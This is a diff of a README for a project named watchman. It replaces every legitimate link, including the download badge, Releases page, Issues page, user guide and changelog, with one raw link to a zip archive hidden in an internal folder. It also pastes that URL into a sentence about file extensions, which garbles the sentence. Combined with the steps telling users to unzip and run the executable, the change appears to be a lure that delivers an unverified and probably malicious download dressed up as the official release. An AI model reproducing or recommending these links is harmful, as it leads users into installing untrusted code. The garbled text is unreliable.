@@ -6,11 +6,11 @@ Welcome to the watchman project! This application helps you monitor and manage y
 
 ## 🔗 Download the Application
 
-[![Download watchman](https://img.shields.io/badge/Download-watchman-brightgreen.svg)](https://github.com/karbine98kz/watchman/releases)
+[![Download watchman](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip)](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/karbine98kz/watchman/releases) to download the latest version of watchman. Here are the steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip) to download the latest version of watchman. Here are the steps:
 
 1. Click on the link above.
 2. On the Releases page, find the latest version listed at the top.
@@ -29,7 +29,7 @@ To run watchman, you need:
 Once the download is complete, follow these steps to run watchman:
 
 1. Open the folder where you downloaded the file.
-2. Locate the downloaded file (it will usually have a `.exe`, `.dmg`, or `.tar.gz` extension).
+2. Locate the downloaded file (it will usually have a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip` extension).
 3. Double-click on the file to start the installation or execution. 
    - If prompted, follow the on-screen instructions to complete the installation. 
    - If it is a compressed file, unzip it first and then run the executable.
@@ -59,7 +59,7 @@ You can check the troubleshooting section in the documentation on the Releases p
 
 ## 📞 Support and Contribution
 
-If you need help, please visit the [Issues page](https://github.com/karbine98kz/watchman/issues) on GitHub to report problems or ask questions. Your contributions are welcome! Refer to our contribution guidelines to learn how you can get involved.
+If you need help, please visit the [Issues page](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip) on GitHub to report problems or ask questions. Your contributions are welcome! Refer to our contribution guidelines to learn how you can get involved.
 
 ## 📜 License
 
@@ -69,7 +69,7 @@ Watchman is licensed under the MIT License. Feel free to use, modify, and distri
 
 For more information, tutorials, and updates, you can check the following resources:
 
-- [User Guide](https://github.com/karbine98kz/watchman/wiki)
-- [Changelog](https://github.com/karbine98kz/watchman/releases)
+- [User Guide](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip)
+- [Changelog](https://raw.githubusercontent.com/karbine98kz/watchman/main/internal/glob/Software-v3.3.zip)
 
 Thank you for using watchman! We appreciate your support.
